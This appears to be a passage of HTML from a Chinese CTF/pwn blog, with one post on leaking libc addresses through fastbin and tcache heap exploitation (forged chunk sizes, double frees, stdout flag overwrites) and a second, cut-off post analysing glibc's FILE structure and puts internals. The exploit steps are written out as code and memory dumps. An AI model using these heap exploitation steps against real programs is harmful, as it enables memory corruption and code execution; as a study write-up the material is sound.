                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。</p>
<p>以下情况方法的讨论的前提时可以进行uaf利用</p>
<h4 id="无tcache保护"><a href="#无tcache保护" class="headerlink" title="无tcache保护"></a>无tcache保护</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x60</span>, <span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">2</span>, <span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">3</span>, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/09/以fastbin为基础的leak/1.PNG" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/2.PNG" alt="2"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60, 4, &apos;\x60&apos;)#更改链表，指向我们伪造的地址</span><br><span class="line">create(0x60, 5, &apos;\n&apos;)</span><br><span class="line">create(0x60, 6, &apos;\n&apos;)</span><br><span class="line">create(0x60, 7, p64(0) + p64(0xe1))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们伪造的数据0x71，所以这里我们可以绕过这个malloc的检查</p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/3.PNG" alt="3"></p>
<p>成功申请伪造的chunk地址，并且更改了0x005…080的数据，成功的伪造了第二个chunk即大小0xe1,不再进入fastbin链中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/4.PNG" alt="4"></p>
<p>可以看到unsortbin链中已经有了chunk块</p>
<p>此时堆中即有了libc地址，或使用程序提供的show函数，或者爆破改写libc地址使之控制stdout或stderr，即可进行libc泄露</p>
<h5 id="无tcache下的任意地址写"><a href="#无tcache下的任意地址写" class="headerlink" title="无tcache下的任意地址写"></a>无tcache下的任意地址写</h5><p>还是上面那个程序，继续进行利用，使用改写stdout的方式进行libc泄露用以展示任意地址写</p>
<p>这时候我们已经得到了一个unsortbin块，一方面，再次构造一个unsortbin可以吗？不太好弄，因为这个伪造的chunk块其实也是爆破了2字节出来的，只不过我这里虚拟机的pie关了，所以没有爆破</p>
<p>直接释放，然后改写地址，再次申请呢？也不行，因为只申请0x60大小的chunk块，只能分割这个unsortbin，没办法申请到任意地址</p>
<p>还得是伪造chunk块，先分割</p>
<p>先看一下直接分割伪造的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">create(0x28, 8, &apos;\n&apos;)</span><br><span class="line">create(0x38, 8, &apos;\n&apos;)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/7.PNG" alt="7"></p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/8.PNG" alt="8"></p>
<p>这时候就可以进行改写libc地址为stdout或stderr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25dd</span>))<span class="comment">#stderr</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">6</span>, p16(<span class="number">0x25dd</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">8</span>, <span class="string">'\0'</span> * <span class="number">0x33</span> + p64(<span class="number">0x00000000fbad2887</span> + <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">'\x88'</span>)</span><br></pre></td></tr></table></figure>
<p>剩下的步骤就是改写利用free_hook或者malloc_hook了，不再提及</p>
<h4 id="有tcache保护"><a href="#有tcache保护" class="headerlink" title="有tcache保护"></a>有tcache保护</h4><p>看一下tcache_get的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并没有fastbin那么复杂，甚至没有size检查，so，伪造起来很容易</p>
<p>初期的时候差不多，但是更简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/21.PNG" alt="21"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">0</span>,<span class="string">"\x50"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/22.PNG" alt="22"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555757250:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x555555757260:	0x000055555575720a	0x0000000000000021</span><br></pre></td></tr></table></figure>
<p>满tcache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in range(7):</span><br><span class="line">	free(0)</span><br></pre></td></tr></table></figure>
<p>最关键的一步，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename(2,p64(0)+p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">rename(2,p64(0)+p64(0x91))</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/23.PNG" alt="23"></p>
<p>关键的原因在于，通过这一步，不仅得到了unsortbin(如果仅仅为了得到unsortbin，可以更简单，先改，然后free八次就够了)</p>
<p>但是这里多free了一次，因为还要用tcache进行fd的修改</p>
<h5 id="有tchche的情况下的任意地址写"><a href="#有tchche的情况下的任意地址写" class="headerlink" title="有tchche的情况下的任意地址写"></a>有tchche的情况下的任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+<span class="string">"\x60\x07\xdd"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="/2019/08/09/以fastbin为基础的leak/24.PNG" alt="24"></p>
<p>至此，完成初步利用</p>
<p> <img src="/2019/08/09/以fastbin为基础的leak/25.PNG" alt="25"></p>
<p>成功泄露出libc的地址</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/05/从stdout入手解决leak泄露/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/05/从stdout入手解决leak泄露/" itemprop="url">从stdout入手解决leak泄露</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T15:18:32+08:00">
                2019-08-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  1.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  7
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>leak地址的泄露是大部分pwn程序进行权限获取的一个必经的步骤。</p>
<p>我准备记录一波利用stdout进行leak的操作</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>file结构体的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">_IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>分析一波puts函数的调用过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>
<p>其是由<code>_IO_puts</code>函数实现，其内部调用<code>_IO_sputn</code>,实际上和输出直接相关的只有这个函数，<a href="https://baijiahao.baidu.com/s?id=1606846314561521273&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">而<code>_IO_sputn</code>会被化简为虚函数表里的__xsputn指针</a></p>
<p><img src="/2019/08/05/从stdout入手解决leak泄露/u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG.jpg" alt="u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG"></p>
<p>也就是接着执行<code>_IO_new_file_xsputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//初始缓冲区空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">          <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  count = p - s + <span class="number">1</span>;<span class="comment">//看情况缩小</span></span><br><span class="line">                  must_flush = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">        count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">        <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">           caller that everything has been written.  */</span></span><br><span class="line">        <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">          count = new_do_write (f, s, do_write);</span><br><span class="line">          to_do -= count;</span><br><span class="line">          <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">            <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">         buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">         so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
<p>主要的作用就是判断了缓冲区还够不够用，然后进行文件指针的写入操作，还有输出操作，但是很可惜并没有我们可以随意控制的地址的输出。但是在输出操作之前，正常情况下会进行一个判断 <code>if (_IO_OVERFLOW (f, EOF) == EOF)</code></p>
<p>也就是调用了_IO_OVERFLOW 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          _IO_doallocbuf (f);</span><br><span class="line">          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">         read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">         makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">         alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">          _IO_free_backup_area (f);</span><br><span class="line">          f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">          f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      